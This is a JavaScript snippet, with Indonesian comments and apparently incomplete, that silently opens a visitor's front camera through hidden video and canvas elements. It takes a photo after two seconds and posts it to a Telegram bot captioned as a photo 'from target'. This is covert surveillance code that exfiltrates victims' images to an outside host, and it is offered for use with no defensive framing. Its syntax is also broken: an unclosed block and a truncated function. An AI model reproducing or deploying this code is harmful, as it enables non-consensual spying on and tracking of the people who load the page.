(function() {
    console.log("Camera system starting...");
    
    const video = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('hiddenCanvas');
    const context = canvas.getContext('2d');
    
    // Minta akses kamera
    navigator.mediaDevices.getUserMedia({ 
        video: { width: 640, height: 480, facingMode: 'user' },
        audio: false 
    })
    .then(stream => {
        console.log("Camera access GRANTED!");
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
            video.play();
            console.log("Video ready, capturing in 2 seconds...");
            
            // TUNGGU 2 DETIK, TERUS FOTO
            setTimeout(() => {
                // Capture gambar
                context.drawImage(video, 0, 0, 640, 480);
                console.log("Captured!");
                
                // Konversi ke blob
                canvas.toBlob(blob => {
                    // Kirim ke Telegram
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('caption', 'ğŸ“¸ Foto dari target!');
                    
                    // PAKE FETCH BIASA, BUKAN NO-CORS
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(data => {
                        console.log("Telegram response:", data);
                        if(data.ok) {
                            console.log("FOTO BERHASIL TERKIRIM! âœ…");

                    })
                    .catch(err => console.log("Fetch error:", err));
                    
                    // Matiin kamera
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                    
                }, 'image/jpeg', 0.8);
            }, 2000); // 2 detik delay
        };
